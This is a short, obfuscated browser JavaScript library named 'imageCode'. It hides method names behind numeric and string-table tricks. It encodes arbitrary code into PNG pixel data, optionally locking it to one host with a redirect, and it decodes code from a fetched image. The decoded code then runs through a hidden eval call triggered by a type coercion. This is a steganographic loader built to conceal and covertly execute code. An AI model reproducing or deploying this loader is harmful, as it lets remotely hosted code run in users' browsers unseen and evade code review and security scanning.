(function(g){
	var _ = function(a){
		return a[__(0x8)](0x24);
	};
	var __ = function(a){
		return da(['gpgdtcfct', 'eueroorro', 'tttaDdoeS', 'CIIwaemat', 'ommItPCtr', 'naamaooei', 'tggaUidEn', 'eeegRnelg', 'xDDeLtPe0', 'taa00Aom0', '0tt00tie0', '0aa000nn0', '000000tt0'])[a];
	};
	var $ = function(a){
		return [Math,String,document][a];
	};
	var cc = function(cp){
		return [~~(cp/256),cp%256];
	};
	var cp = function(c1,c2){
		return (c1||c2)?c1*256+c2:0;
	};
	var dl = function(s,cb){
		var cb = cb||function(){};
		var a = new Image();
		a.src = s;
		a.addEventListener('load',function(){
			cb(a);
		});
	};
	var da = function(a){
		var d = [];
		a.forEach(function(a){
			 for(var i=0;i<9;i++){
			 	if(!d[i]){
			 		d[i]='';
			 	}
			 	a[i]!='0'&&(d[i]+=a[i]);
			}
		});
		return d;
	};
	var r = function(s){
		return s[_(0x2dfd535)]('')[_(0xde4c0ab2e)]()[0xe02df]('');
	};
	var a = {};
	a[_(0x34cb7562)] = function(c,h){
		if(h){
			c=r('"==tsoh.noitacol(fi')+h+'"){'+c+r('" = ferh.noitacol{esle}')+h+'";}';
		}
		var cp = c[_(0x2dfd535)]('')[_(0x70e1)](function(a){
			return a[__(0x5)](0);
		});
		var cl = [];
		if(cp[_(0x4d26f6e5)]%2){
			cp[_(0x126821)](0x20);
		}
		for(var i=0;i<cp[_(0x4d26f6e5)];i+=2){
			var c1 = cc(cp[i]);
			var c2 = cc(cp[i+1]);
			cl = cl[_(0x2db76605)]([c2[1],c1[0],c1[1],c2[0]]);
		}
		var sz = $(0)[_(0x8d47d)]($(0)[_(0x147689)]($(0)[_(0x8d47d)](cl[_(0x4d26f6e5)]*4/3)/4));
		var ca = $(2)[__(0x7)](_(0x2c50f834));
		ca[_(0x3413675)] = sz;
		ca[_(0x3eb8d601)] = sz;
		var ct = ca[__(0x0)](_(0x55));
		var idt = ct[__(0x2)](0, 0, ca[_(0x3413675)], ca[_(0x3eb8d601)]);
		for(var i=0;i<idt[_(0x977fe)][_(0x4d26f6e5)];i+=4){
			var idx = 3*~~(i/4);
			idt[_(0x977fe)][i] = cl[idx]||0;
			idt[_(0x977fe)][i+1] = cl[idx+1]||0;
			idt[_(0x977fe)][i+2] = cl[idx+2]||0;
			idt[_(0x977fe)][i+3] = 0xff;
		}
		ct[__(0x1)](idt,0, 0);
		return ca[__(0x4)](_(0x1dd306e)+'/'+_(0x81dc));
	};
	a[_(0x790d1f902)] = function(s){
		dl(s,function(a){
			var ca = $(2)[__(0x7)](_(0x2c50f834));
			ca[_(0x3413675)] = a[_(0x3413675)];
			ca[_(0x3eb8d601)] = a[_(0x3eb8d601)];
			var ct = ca[__(0x0)](_(0x55));
			ct[__(0x3)](a, 0, 0, ca[_(0x3413675)], ca[_(0x3eb8d601)]);
			var idt = ct[__(0x2)](0, 0, ca[_(0x3413675)], ca[_(0x3eb8d601)]);
			var cl = [];
			for(var i=0;i<idt[_(0x977fe)][_(0x4d26f6e5)];i+=4){
				var idx = 3*~~(i/4);
				cl[idx] = idt[_(0x977fe)][i];
				cl[idx+1] = idt[_(0x977fe)][i+1];
				cl[idx+2] = idt[_(0x977fe)][i+2];
			}
			var o = {c:[]};
			o[__(0x8)] = function(){
				g[_(0xa95ed)](o.c[_(0xe02df)](''));
				return cl[_(0xe02df)]('');
			};
			for(var i=0;i<cl[_(0x4d26f6e5)];i+=4){
				var c1 = cp(cl[i+1],cl[i+2]);
				var c2 = cp(cl[i+3],cl[i]);
				c1&&o.c[_(0x126821)]($(1)[__(0x6)](c1));
				c2&&o.c[_(0x126821)]($(1)[__(0x6)](c2));
			}
			return o=='';
		});
	};
	g.imageCode = a;
})(window);